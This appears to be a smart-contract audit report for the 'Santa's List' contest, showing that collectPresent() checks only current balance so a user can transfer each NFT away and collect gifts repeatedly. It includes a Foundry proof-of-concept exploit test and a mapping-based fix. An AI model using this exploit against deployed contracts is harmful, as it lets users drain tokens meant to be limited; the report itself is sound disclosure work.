## [H1] Malicious User can collect infinite gifts

### Severity

High Risk

### Date Modified

Dec 4th, 2023

### Summary

The idea of the protocol is to let users collect one present per person, just one. To guarantee this, they add the next statement in the `collectPresent()`` function:

```
if (balanceOf(msg.sender) > 0) {
    revert SantasList__AlreadyCollected();
}
```

But overcoming this statement is easy, just send the gift to another account and collect again. In this way, a user can have an infinite number of gifts.

### Vulnerability Details (PoC)

As this is a PoC, I limit the number of gifts to 10, but it works infinitely.

```
function test_collectPresentNeedsControl() public {
        // 1. Santa thought user is a NICE person...
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // 2. But he/she is not ;-)
        vm.startPrank(user);
        for (uint256 i = 0; i < 10; ++i) {
            santasList.collectPresent();
            santasList.transferFrom(user, userSecondAccount, i);
        }
        vm.stopPrank();

        // 3. user can continue collecting gifts
        assertEq(santasList.balanceOf(user), 0);
        assertEq(santasList.balanceOf(userSecondAccount), 10);
    }
```

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt test_collectPresentNeedsControl
[⠢] Compiling...
[⠔] Compiling 1 files with 0.8.22
[⠒] Solc 0.8.22 finished in 1.31s
Compiler run successful!

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[PASS] test_collectPresentNeedsControl() (gas: 488578)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.82ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Impact

This is an Enourmous problem, as any user can collect an infinite number of gifts.

### Tools Used

Manual, foundry

### Recommendations

It is necessary to track effectively if the user has already collected the gift. To do this, we will create a mapping that changes from false to true after collection.

```
mapping(address person => bool isCollected) private s_giftCollected;
```

```
function checkTwice(address person, Status status) external onlySanta {
    if (s_theListCheckedOnce[person] != status) {
        revert SantasList__SecondCheckDoesntMatchFirst();
    }
    s_theListCheckedTwice[person] = status;
////// HERE /////
    s_giftCollected[person] = false;
    emit CheckedTwice(person, status);
    }
```

```
function collectPresent() external {
        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
////// 1. ADD THE REQUIRE ///////
        require(s_giftCollected[msg.sender] == false, "Already collected");

        if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
        if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {

////// 2. SET AS TRUE ///////
            s_giftCollected[msg.sender] = true;

            _mintAndIncrement();
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
                && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            s_giftCollected[msg.sender] = true;
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            return;
        }
        revert SantasList__NotNice();
    }
```

In this way, the function will work for one gift per user and will fail if you try to collect more than one gift.

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt testCollectPresentNice
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[PASS] testCollectPresentNice() (gas: 119152)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.43ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
➜  2023-11-Santas-List git:(main) ✗
```

```
➜  2023-11-Santas-List git:(main) ✗ forge test --mt test_collectPresentNeedsControl
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/unit/SantasListTest.t.sol:SantasListTest
[FAIL. Reason: revert: Already collected] test_collectPresentNeedsControl() (gas: 149625)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.54ms

Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/unit/SantasListTest.t.sol:SantasListTest
[FAIL. Reason: revert: Already collected] test_collectPresentNeedsControl() (gas: 149625)

Encountered a total of 1 failing tests, 0 tests succeeded
➜  2023-11-Santas-List git:(main) ✗
```
